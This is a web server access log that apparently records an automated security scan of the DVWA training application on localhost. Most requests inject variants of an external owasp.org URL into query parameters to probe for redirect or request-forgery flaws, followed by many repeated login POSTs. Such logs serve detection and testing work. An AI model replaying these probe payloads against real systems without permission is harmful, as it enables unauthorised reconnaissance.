172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 624 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1315 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/add_event_listeners.js?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js/dvwaPage.js?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /favicon.ico?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?doc=393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?doc=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /login.php?query=393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /login.php?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?doc=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /instructions.php?doc=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /login.php?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /instructions.php?doc=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /login.php?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /instructions.php?doc=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /login.php?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /login.php?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /instructions.php?doc=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /login.php?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /instructions.php?doc=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /login.php?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /login.php?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /instructions.php?doc=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /robots.txt?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
